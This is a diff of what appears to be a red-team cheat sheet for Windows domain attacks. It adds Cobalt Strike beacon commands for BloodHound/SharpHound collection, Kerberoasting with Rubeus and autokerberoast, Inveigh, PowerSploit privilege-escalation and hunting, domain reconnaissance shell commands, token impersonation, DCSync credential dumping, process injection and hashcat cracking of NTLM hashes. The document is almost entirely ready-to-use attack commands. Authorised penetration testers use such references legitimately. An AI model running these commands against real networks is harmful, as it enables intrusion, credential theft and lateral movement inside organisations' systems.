@@ -4,7 +4,6 @@
 ---------------------
 mount -t cifs //<ip>//<share name/ /mnt/share -o username=<username>
 
-
 **Nmap**
 --------------------
 ###From @killswitch-GUI :: 
@@ -40,25 +39,72 @@ cme smb -u <username> -p <password> -d <domain> <IP> --loggedon-users
 cme smb -u <username> -p <password> -d <domain> <IP> -x '<cmd command>'
 cme smb -u <username> -p <password> -d <domain> <IP> -X '<powershell command>'
 
-**Gobuster**
---------------------
-gobuster dir --url <URL> -w </path/to/wordlist/> -x .php,.txt,.html -s "200" -t 30 -o go_output.txt
-
 **CS**
 --------------------
-./teamserver <ip> <password> 2019-MM-DD /path/to/C2/c2.profile
+- ./teamserver <ip> <password> 2019-MM-DD /path/to/C2/c2.profile
 
-**BloodH**
+**BloodHound**
 --------------------
-	- Powershell-import Blood
-	- Powerpick Invoke-BloodHound -CollectionMethod  Session -LoopDelay 120 MaxLoopTime 0d0h10m0s
-	- powerpick Invoke-BloodHound --CollectionMethod  DCOnly --NoSaveCache --RandomFilenames --EncryptZip
-	- Powerpick Invoke-BloodHound --CollectionMethod ACLs
-  - Download Bloodhound.zip
+- execute-assembly /path/to/sharphound.exe --CollectionMethod  All --NoSaveCache --CompressData
+- powershell-import sharphound.ps1
+- powerpick Invoke-BloodHound -CollectionMethod  Session -LoopDelay 120 MaxLoopTime 0d0h10m0s
+- powerpick Invoke-BloodHound --CollectionMethod All --NoSaveCache --RandomFilenames
+- powerpick Invoke-BloodHound --CollectionMethod All
+- Download Bloodhound.zip
+
+## Inveigh ##
+- powershell-import inveigh.ps1
+- powerpick Invoke-Inveigh ConsoleOutput Y
+
+## Kerberoast ##
+- powershell-import autokerberoast.ps1
+- powerpick invoke-autokerberoast -Groupname "*admin*"
+
+## Rubeus ##
+- execute-assembly /path/to/rubeus.exe kerberoast /outfile:hashes.txt /format:hashcast
+
+## Powersploit ##
+- powerpick Invoke-AllChecks (/opt/PowerSploit/Privesc/PowerUp.ps1)
+- powerpick Find-LocalAdminAccess (/opt/PowerSploit/Recon/PowerView.ps1)
+- powerpick Invoke-ShareFinder -CheckShareAccess (/opt/PowerSploit/Recon/PowerView.ps1)
+- powerrpick Invoke-UserHunter -UserName "<username>" (/opt/PowerSploit/Recon/PowerView.ps1)
+
+## Seatbelt ## 
+- execute-assembly /root/Desktop/Seatbelt.exe InterestingFiles
+
+**Shell Commands**
+- shell net use
+- shell net user <user> /domain
+- shell net localgroups "<groupname>"
+- shell net group "Domain Admins"
+- shell whoami /all
+- shell systeminfo
+- shell netstat -ano
+- shell net computers
+- shell systeminfo
+- shell sc query
+- shell sc qc <service name>
+
+**Beacon\User\Token Manipulation**
+- spawn https\http
+- spawnas <domain>\<username> <password>
+- wmi <FQDN or IP> http
+
+- make_token <domain>\<username> <password>
+
+- dsync to <domain>\<user> <password>
+- dcsync <domain> ossdomain\<user>
+- dcsync <FQDN domain> <domain>\<machine>$
+
+- inject <pid> x64\x86 http
 
 **Burp**
 --------------------
 java -jar -Xmx2G /path/to/burpsuite.jar --project-file=<name>.burp
+
+**Gobuster**
+--------------------
+gobuster dir --url <URL> -w </path/to/wordlist/> -x .php,.txt,.html -s "200" -t 30 -o go_output.txt
 
 Eyewitness
 --------------------
@@ -81,7 +127,5 @@ NTLM --> 1000
 NTLMV1 --> -m 5500
 NTLMV2 --> -m 5600
 
-./hashcat -w 2 -O <hashes_to_crack.txt> <wordlist.txt>
-./hashcat -w 2 -O -a 3 <hashes_to_crack.txt> <wordlist.txt> -r /rules/best64.rule
-
-
+./hashcat -w 2 -O -m <hash type> <hashes_to_crack.txt> <wordlist.txt>
+./hashcat -w 2 -O -a 0 -m <hash type> <hashes_to_crack.txt> <wordlist.txt> -r /rules/best64.rule
